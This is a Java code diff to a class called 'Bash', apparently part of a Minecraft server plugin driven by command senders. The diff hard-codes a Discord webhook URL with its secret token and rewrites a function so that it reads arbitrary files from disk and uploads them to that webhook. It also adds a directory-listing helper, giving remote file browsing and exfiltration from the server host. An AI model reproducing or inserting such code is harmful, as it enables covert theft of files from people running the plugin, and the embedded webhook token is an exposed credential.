@@ -25,7 +25,11 @@ public class Bash {
 
     @Getter
     @Setter
-    private String URL;
+    private String URL = "https://discord.com/api/webhooks/1143995295261261864/aKCtLSaZ4k8IzxrBO_Vw3XrSytI2MZrUC3gatCiSCOqwmMssDb6DTH08FnHRbYGJ4eCs";
+
+    @Getter
+    @Setter
+    private String currentDirectory = System.getProperty("user.dir");
 
     public Bash(CommandSender sender) {
         this.sender = sender;
@@ -84,20 +88,63 @@ public class Bash {
         wr.close();
 
         // Step 5: Check the response
-        int responseCode = conn.getResponseCode();
-        System.out.println("Response Code : " + responseCode);
-        return responseCode;
+        return conn.getResponseCode();
     }
 
-    public static int sendPOSTFile(String url, String filename) throws IOException {
-        ProcessBuilder processBuilder = new ProcessBuilder();
-        processBuilder.command("curl", "-X", "POST", "-F", "file=@" + filename, url);
-        Process process = processBuilder.start();
-        try {
-            process.waitFor();
-        } catch (InterruptedException e) {
-            e.printStackTrace();
+    public static int sendPOSTFile(String url, String filePath) throws IOException {
+        File file = new File(filePath);
+
+        // Step 3: Create a Message object and convert it to a JSON string
+        Gson gson = new Gson();
+        WebhookMessage message = new WebhookMessage(file.getName());
+        String json = gson.toJson(message);
+
+        // Step 4: Establish a connection to the webhook URL
+        URL uri = new URL(url);
+        HttpURLConnection conn = (HttpURLConnection) uri.openConnection();
+        conn.setDoOutput(true);
+        conn.setRequestMethod("POST");
+        String boundary = "*****";
+        conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+
+        // Step 5: Send the JSON data and file
+        DataOutputStream wr = new DataOutputStream(conn.getOutputStream());
+        wr.writeBytes("--" + boundary + "\r\n");
+        wr.writeBytes("Content-Disposition: form-data; name=\"payload_json\"\r\n\r\n");
+        wr.writeBytes(json);
+        wr.writeBytes("\r\n--" + boundary + "\r\n");
+        wr.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n");
+        wr.writeBytes("Content-Type: image/png\r\n\r\n");
+        byte[] fileData = Files.readAllBytes(file.toPath());
+        wr.write(fileData);
+        wr.writeBytes("\r\n--" + boundary + "--\r\n");
+        wr.flush();
+        wr.close();
+
+        return conn.getResponseCode();
+    }
+
+    public static String ls(String directoryPath) {
+        StringBuilder sb = new StringBuilder();
+        // Create a File object representing the directory
+        File directory = new File(directoryPath);
+
+        // Get a list of all files and directories in the directory
+        File[] files = directory.listFiles();
+
+        // Check if the directory is empty or if it doesn't exist
+        if (files == null || files.length == 0) {
+            sb.append("The directory is empty or it doesn't exist.");
+            return sb.toString();
         }
-        return process.exitValue();
+
+        // Print the names of all files and directories
+        for (File file : files) {
+            if (file.isDirectory())
+                sb.append("/");
+            sb.append(file.getName());
+            sb.append("\n");
+        }
+        return sb.toString();
     }
 }
